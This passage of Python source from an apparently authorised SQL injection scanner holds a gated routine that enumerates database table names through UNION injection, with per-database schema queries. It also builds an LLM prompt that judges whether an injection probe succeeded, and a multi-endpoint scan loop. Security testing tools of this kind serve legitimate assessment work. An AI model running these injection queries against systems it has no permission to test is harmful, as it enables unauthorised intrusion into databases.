                        f"No application/user data was accessed. PoC payload: {payload}")
        return None

    # ──────────────────────────────────────────────────────────────────────────
    # GATED EXPLOITATION — enumerate TABLE NAMES only (schema metadata, no rows)
    # ──────────────────────────────────────────────────────────────────────────
    def _enumerate_tables(
        self, url, method, param_name, param_type,
        baseline_value, extra_body, base_query, dbms: Optional[str],
    ) -> Optional[str]:
        """Enumerate the database's TABLE NAMES via UNION — schema metadata only.

        This is deeper than confirmation but still **reads no row data**: it lists
        table names (e.g. users, products), not their contents. Gated behind the
        --exploit flag + an explicit authorisation prompt in main.py.
        """
        # Table-name aggregate per DBMS (prefer the fingerprinted form).
        tbl_by_dbms = {
            "SQLite":  "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
            "MySQL":   "(SELECT group_concat(table_name) FROM information_schema.tables "
                       "WHERE table_schema=database())",
            "PostgreSQL": "(SELECT string_agg(table_name,',') FROM information_schema.tables "
                          "WHERE table_schema='public')",
            "Microsoft SQL Server": "(SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U')",
            "Oracle":  "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables)",
        }
        exprs = []
        if dbms in tbl_by_dbms:
            exprs.append(tbl_by_dbms[dbms])
        for e in (tbl_by_dbms["SQLite"], tbl_by_dbms["MySQL"]):   # fallbacks
            if e not in exprs:
                exprs.append(e)

        res = self._union_extract(url, method, param_name, param_type,
                                  baseline_value, extra_body, base_query, exprs, dbms)
        if not res:
            return None
        payload, ncols, pre, val = res
        if not val:
            return None
        names = [t.strip() for t in re.split(r"[,\s]+", val) if t.strip()][:40]
        boundary = (pre + "…UNION") if pre else "UNION"
        return (f"Schema enumerated via {boundary} [{ncols} cols] — TABLE NAMES ONLY "
                f"(no row data read): {', '.join(names)} [{len(names)} table(s)]. "
                f"PoC payload: {payload}")

    # ──────────────────────────────────────────────────────────────────────────
    # LLM ANALYSIS
    # ──────────────────────────────────────────────────────────────────────────
    def _llm_analyse(
        self,
        endpoint: str, method: str, param: str,
        payload: Payload,
        resp:    HTTPResponse,
        baseline: HTTPResponse,
        evidence: str,
        signals: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:
        """Final-arbiter LLM pass with FULL visibility of every signal and the
        raw responses. Returns a structured verdict dict (or None on failure)."""
        ctx = {
            "endpoint": f"{method} {endpoint}",
            "parameter": param,
            "payload": payload.value,
            "payload_category": payload.category.value,
            "payload_severity": payload.severity,
            "heuristic_evidence": evidence or "(none — static heuristics did NOT flag this probe)",
            "signals": {
                "db_error_patterns_matched": signals["db_errors"],
                "sqli_indicators_matched": signals["indicators"],
                "expected_indicator_hit": signals["expected_hit"],
                "baseline_status": baseline.status_code,
                "payload_status": resp.status_code,
                "status_changed": signals["status_changed"],
                "baseline_time_ms": round(baseline.response_time_ms),
                "payload_time_ms": round(resp.response_time_ms),
                "time_delta_ms": round(signals["time_delta"]),
                "baseline_body_len": signals["blen"],
                "payload_body_len": signals["plen"],
                "body_len_ratio": round(signals["len_ratio"], 2),
                "baseline_rows": signals["rows_b"],
                "payload_rows": signals["rows_p"],
                "http_500_from_200": signals["http_500"],
            },
        }
        prompt = f"""You are a senior web-application security engineer and the FINAL ARBITER on
whether a SQL injection probe succeeded. You can see EVERY detection signal and the raw
HTTP responses below. The fast static heuristics may have MISSED a genuine vulnerability,
or RAISED a false positive — judge independently from the full evidence, not just one signal.

FULL CONTEXT (JSON):
{json.dumps(ctx, indent=2)}

PAYLOAD RESPONSE BODY (first 1500 chars):
{resp.body[:1500]}

BASELINE RESPONSE BODY (first 400 chars):
{baseline.body[:400]}

Weigh ALL signals together (errors, timing, status, length, row-count, reflected SQL,
indicators). Decide if THIS payload reveals a genuine SQL injection.

BE STRICT — minimise false positives. Set "confirmed": true ONLY when the evidence
unambiguously shows the query was altered, e.g.:
  • a leaked SQL/database error message, or
  • UNION / schema / version data reflected in the response, or
  • a tautology returning MORE rows than the baseline, or
  • a reliable time delay matching a time-based payload, or
  • a clear, consistent boolean oracle (true vs false responses differ as expected).
The following are NOT sufficient on their own → "confirmed": false:
  • an empty or smaller result set, a generic 4xx/5xx, or a small length/status
    change with no other corroboration,
  • a payload that was clearly treated as a literal string value (e.g. a numeric
    boolean payload landing inside quotes that simply matches no row).
A SINGLE boolean-style payload (e.g. `1 AND 1=2`) that merely returns fewer/no
rows is NOT proof: boolean-blind injection can only be established by comparing a
TRUE vs FALSE payload, which you cannot do from one probe. So for an isolated
boolean payload whose only signal is a row/length change and which shows no SQL
error and no reflected SQL/UNION data, answer "confirmed": false.
When in doubt, answer "confirmed": false.

Respond with ONLY this JSON (no markdown, no preamble):
{{
  "confirmed": true,
  "confidence": 0.0,
  "sqli_type": "<UNION | Boolean-blind | Time-based | Error-based | Stacked | Auth-bypass | ...>",
  "missed_by_static": false,
  "reasoning": "<=2 sentences citing the specific signals you relied on",
  "attack_vector": "<1-2 sentences>",
  "business_impact": "<1-2 sentences>",
  "remediation": "<single most important fix>"
}}"""

        raw = self.llm.analyse(prompt)
        if not raw:
            return None
        clean = raw.replace("```json", "").replace("```", "").strip()
        try:
            p = json.loads(clean)
        except Exception:
            return {"confirmed": None, "confidence": 0.0,
                    "missed_by_static": False, "display": f"AI: {raw[:240]}"}

        confirmed = bool(p.get("confirmed"))
        try:
            conf = float(p.get("confidence", 0.0))
        except (TypeError, ValueError):
            conf = 0.0
        missed = bool(p.get("missed_by_static"))

        if confirmed:
            tag = "AI CONFIRMED" + (" [MISSED BY STATIC]" if missed else "")
            display = (f"{tag} {p.get('sqli_type','?')} (conf {conf:.2f}) | "
                       f"{p.get('reasoning','')} | Vector: {p.get('attack_vector','?')} | "
                       f"Impact: {p.get('business_impact','?')} | Fix: {p.get('remediation','?')}")
        else:
            display = f"AI: likely false positive (conf {conf:.2f}) — {p.get('reasoning','')}"

        return {"confirmed": confirmed if p.get("confirmed") is not None else None,
                "confidence": conf, "missed_by_static": missed, "display": display}

    # ──────────────────────────────────────────────────────────────────────────
    # CONVENIENCE: SCAN MULTIPLE ENDPOINTS AT ONCE
    # ──────────────────────────────────────────────────────────────────────────
    def scan_target(self, scan_plan: List[dict]) -> Dict[str, List[Finding]]:
        """
        scan_plan: list of dicts with keys:
          endpoint, method, param_name, param_type, [baseline_value], [extra_body], [categories]
        """
        results = {}
        for spec in scan_plan:
            key = f"{spec['method']} {spec['endpoint']}"
            payloads = None
            if "categories" in spec:
                payloads = []
                for cat in spec["categories"]:
                    payloads.extend(get_payloads_by_category(cat))
            findings = self.scan_endpoint(
                endpoint       = spec["endpoint"],
                method         = spec["method"],
                param_name     = spec["param_name"],
                param_type     = spec["param_type"],
                baseline_value = spec.get("baseline_value", "1"),
                extra_body     = spec.get("extra_body"),
                payloads       = payloads,
            )
            results[key] = findings
        return results
